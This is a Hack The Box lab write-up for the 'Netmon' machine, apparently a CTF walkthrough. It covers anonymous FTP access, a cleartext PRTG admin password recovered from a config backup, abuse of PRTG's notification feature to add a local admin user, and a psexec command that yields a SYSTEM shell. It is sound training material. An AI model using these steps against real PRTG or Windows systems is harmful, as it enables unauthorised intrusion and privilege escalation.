![Pasted image 20230720111614](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/de1a4109-7a70-4025-ad38-e3ead48a1bd0)

# Enumeration
```nmap
Nmap scan report for 10.129.96.142
Host is up (0.064s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-20T15:20:31
|_  start_date: 2023-07-20T15:16:22
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

NSE: Script Post-scanning.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds

```
Lots to work with here. 
- FTP looks to be just wide open from what I can tell. 
- Web service running `Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)` whatever that is... 
- SMB looks to also be possible. 

# Foothold
The FTP method allows me full access to the directory system at a user level. 
```
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd Public
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
07-20-23  11:17AM                   34 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
```
User flag achieved!
Can't access the Admin directory. Will likely need a different exploit for that...

# PrivEsc
I couldn't find anything useful in the main folders, so I decided to expand my search to find hidden folders:
```ftp
ftp> dir -a:hd
200 PORT command successful.
125 Data connection already open; Transfer starting.
11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
07-20-23  11:16AM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
12-15-21  10:40AM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> 
```
Maybe I can find something interesting in ProgramData...
```
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-20-23  11:27AM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> pwd
257 "/ProgramData/Paessler" is current directory.
ftp> cd "PRTG Network Monitor"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-20-23  11:27AM       <DIR>          Configuration Auto-Backups
07-20-23  11:27AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
07-20-23  11:27AM       <DIR>          Logs (Web Server)
07-20-23  11:27AM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
07-20-23  11:27AM              1641139 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
ftp>
```
Found the config files. Now to dig.

There are lines for passwords in all the configuration files, but all are deleted except for one in `PRTG Configuration.old.bak`
```xml
...SNIP...
<dbpassword>
	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
            </dbpassword>
            <dbtimeout>

...SNIP...
```
`PrTg@dmin2018` is the password!
Going to the website, the password doesn't work...

Thinking about the file, this is a backup file and the password says 2018. The box is from a year later. Trying 2019 at the end gets me in:

![Pasted image 20230720120554](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/c97bd25c-34ff-41c1-ab03-b25645b464f5)

Woo!
I found a metasploit module for authenticated RCE early on. Now that I have a working password and username, I should be able to use it!
No joy... It looked like it was going to work too... hmmm....

No easy win. Let's look into the website a bit...

After doing some googling, I discovered there is a way to run commands from this panel on the system. I can use this to create a user.

I go to Setup > Account Settings > Notifications
From here I click the + icon and create a new notification. Leaving everything as is, select "Execute Program" and fill out the following:

![Pasted image 20230720123001](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/1cacebf3-0a15-425f-958e-7ffdf9332989)

This will add a user called anon and set the password to be `abc123!`, then add it to the local administrator group. After saving, clicking the box to the far right of the notification I made and selecting test should run the command:

![Pasted image 20230720121952](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/d9d31f70-4a21-4fa5-90f5-44dc8530839a)

![Pasted image 20230720122008](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/c8505def-4509-4b4d-b53a-a2901b1efb37)

Now I should be able to log in with those credentials:
```
psexec.py hacker:'abc123!'@10.129.96.142
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on 10.129.96.142.....
[*] Found writable share ADMIN$
[*] Uploading file ZeFyOUCb.exe
[*] Opening SVCManager on 10.129.96.142.....
[*] Creating service xIEb on 10.129.96.142.....
[*] Starting service xIEb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```
Netmon is PWNED!
